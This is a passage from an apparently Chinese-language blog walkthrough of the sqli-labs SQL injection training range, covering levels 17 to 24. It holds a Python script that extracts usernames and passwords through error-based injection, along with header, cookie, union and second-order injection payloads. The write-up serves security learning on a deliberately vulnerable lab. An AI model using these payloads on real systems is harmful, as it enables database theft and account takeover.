</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.schemata),0x7e),1)#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_username</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#err_payload = {&#34;uname&#34;: &#34;admin&#34;, &#34;passwd&#34;: &#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),%d,20) from users),0x7e),1)#&#34; % i, &#34;submit&#34;: &#34;Submit&#34;}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#You can&#39;t specify target table &#39;users&#39; for update in FROM clause</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#err_payload = {&#34;uname&#34;: &#34;admin&#34;, &#34;passwd&#34;: &#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),%d,20) from (select username from users)),0x7e),1)#&#34; % i, &#34;submit&#34;: &#34;Submit&#34;}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#Every derived table must have its own alias</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),</span><span class="si">%d</span><span class="s2">,20) from (select username from users)abc),0x7e),1)#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;passwd&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),</span><span class="si">%d</span><span class="s2">,20) from (select password from users)abc),0x7e),1)#&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span> <span class="s2">&#34;submit&#34;</span><span class="p">:</span> <span class="s2">&#34;Submit&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_database_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_table_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_column_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_username</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_password</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="less-18">Less-18</h3>
<p>登录回显发现uagent</p>
<p>在header中设置<code>User-Agent: '</code>回显<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1', 'admin')' at line 1</code></p>
<p>推测对uagent进行了保存,保存方式为<code>value('$uagent','$ip','$uname')</code></p>
<p>设置header<code>User-Agent: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1</code>从而构成闭合</p>
<p>构成的sql语句为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">security</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">uagents</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">uagent</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">ip_address</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="nf">length</span><span class="p">(</span><span class="k">database</span><span class="p">())),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;192.168.8.1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>后面的注入与报错注入类似</p>
<h3 id="less-19">Less-19</h3>
<p>登录回显发现referer</p>
<p>在header中设置<code>Referer: '</code>回显<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1')' at line 1</code></p>
<p>推测对uagent进行了保存,保存方式为<code>value('$referer','$ip')</code></p>
<p>设置header<code>Referer: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1</code>从而构成闭合</p>
<p>构成的sql语句为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">security</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">referers</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">referer</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">ip_address</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="nf">length</span><span class="p">(</span><span class="k">database</span><span class="p">())),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;192.168.8.1&#39;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>后面的注入与报错注入类似</p>
<h3 id="less-20">Less-20</h3>
<p>登录后返回</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span></span><span class="line"><span class="cl">YOUR IP ADDRESS IS : 192.168.8.1
</span></span><span class="line"><span class="cl">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
</span></span><span class="line"><span class="cl">YOUR COOKIE : uname = admin and expires: Sat 08 May 2021 - 13:56:57
</span></span><span class="line"><span class="cl">Your Login name:admin
</span></span><span class="line"><span class="cl">Your Password:admin
</span></span><span class="line"><span class="cl">Your ID:8
</span></span></code></pre></td></tr></table>
</div>
</div><p>在header中设置<code>Cookie: uname='asdf</code>回显<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf' LIMIT 0,1' at line 1</code></p>
<p>对cookie中的uname进行了查询处理</p>
<p>设置header<code>Cookie: uname=' and updatexml(1,concat(0x7e,(length(database())),0x7e),1)#</code></p>
<p>后面的注入与报错注入类似</p>
<h3 id="less-21">Less-21</h3>
<p>登录后返回</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
</span></span><span class="line"><span class="cl">YOUR IP ADDRESS IS : 192.168.8.1
</span></span><span class="line"><span class="cl">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
</span></span><span class="line"><span class="cl">YOUR COOKIE : uname = YWRtaW4= and expires: Sat 08 May 2021 - 14:09:25
</span></span><span class="line"><span class="cl">Your Login name:admin
</span></span><span class="line"><span class="cl">Your Password:admin
</span></span><span class="line"><span class="cl">Your ID:8
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到uname被base64转码</p>
<p>在header中设置<code>Cookie: uname=J2FzZGY=</code>回显<code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf') LIMIT 0,1' at line 1</code></p>
<p>可知uname的查询方式为<code>('$uname')</code></p>
<p>对cookie中的uname进行了查询处理</p>
<p>设置header<code>Cookie: uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChsZW5ndGgoZGF0YWJhc2UoKSkpLDB4N2UpLDEpIw==</code></p>
<p>后面的注入与报错注入类似</p>
<h3 id="less-22">Less-22</h3>
<p>与Less-21类似,把闭合方式换成<code>&quot;</code></p>
<h2 id="advanced-injections">Advanced Injections</h2>
<h3 id="less-23">Less-23</h3>
<p>传入<code>?id='</code>报错,说明闭合方式为<code>'</code>,传入<code>?id=-1' or 1=1-- </code>,发现<code>-- </code>并没有生效,推测对注释符进行了过滤</p>
<p>传入<code>?id=1' order by 4,'1</code>,报错<code>Unknown column '4' in 'order clause'</code>说明一共有3列</p>
<blockquote>
<p>注意要有<code>'1</code>来对最后的<code>'</code>进行闭合</p>
</blockquote>
<p>查表名<code>?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'1</code></p>
<p>查列名<code>?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'1</code></p>
<p>查用户名<code>?id=-1' union select 1,(select group_concat(username) from users),'1</code>,查密码同理</p>
<p>也可以用报错注入<code>?id=1' or updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1) or '1'='1</code></p>
<h3 id="less-24">Less-24</h3>
<blockquote>
<p>题目提示存在二次注入</p>
</blockquote>
<p>注册用户名<code>test</code>,密码<code>test</code>,登录进入后发现存在密码修改选项,结合题目提示,猜测其应该是通过构造特殊的用户名达成二次注入,从而在密码修改处修改其他用户的密码</p>
<p>推测修改密码处的sql语句为<code>update users set password='$password' where username='$username'...</code></p>
<p>假设注册一个新的用户名为<code>test#'</code>,其在修改密码时构成了sql语句<code>update users set password='xxx' where username='test'#'...</code></p>
<p>从而成功修改用户<code>test</code>的密码</p>
<ul>
<li>猜测验证</li>
</ul>
<ol>
<li>注册用户<code>test</code></li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20141913.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20141913.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20141913.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20141913.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20141913.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20141913.png" /></p>
<ol start="2">
<li>注册用户<code>test#'</code></li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142059.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142059.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142059.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142059.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142059.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142059.png" /></p>
<ol start="3">
<li>对用户<code>test#'</code>的密码进行修改</li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142205.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142205.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142205.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142205.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142205.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142205.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142249.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142249.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142249.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-29%20142249.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142249.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-29%20142249.png" /></p>
<ul>
<li>源码分析</li>
</ul>
<p>在<code>login_create.php</code>中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pass</span><span class="o">=</span><span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re_pass</span><span class="o">=</span><span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into users ( username, password) values(</span><span class="se">\&#34;</span><span class="si">$username\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nx">\</span><span class="s2">&#34;</span><span class="si">$pass\</span><span class="s2">&#34;</span><span class="p">)</span><span class="s2">&#34;;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>login.php</code>中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
